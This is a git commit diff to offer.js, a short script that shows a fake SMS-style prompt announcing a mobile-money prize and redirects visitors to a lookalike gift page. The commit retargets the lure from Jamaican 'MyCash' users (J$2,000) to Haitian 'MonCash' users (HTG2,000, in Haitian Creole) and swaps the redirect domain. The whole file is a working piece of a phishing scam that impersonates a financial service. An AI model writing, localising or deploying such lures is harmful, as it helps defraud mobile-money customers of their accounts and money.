e2141a70eaa0e704851b6e6937454b9b4c9da27d
kenycruzk <kenycruzk@gmail.com>
2025-12-13 16:41:25 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'CLAIM J$2,000'
-password=prompt('SMS: Congratulations Your MyCash Account is Eligible to receive J$2,000 MyCash Anniversary Offer, Kindly Press OK to PROCEED  ','CLAIM J$2,000');
-if (password != 'CLAIM J$2,000') {
-location.href='https://mycash-reward.alloffers.org/gift';
+var password = 'HTG2,000'
+password=prompt('SMS: Felisitasyon, Kont MonCash ou a kalifye pou resevwa òf Nwèl MonCash HTG2,000 la. Tanpri peze OK pou KONTINYE.  ','HTG2,000');
+if (password != 'HTG2,000') {
+location.href='https://moncash.goprogram.xyz/gift';
 }
+
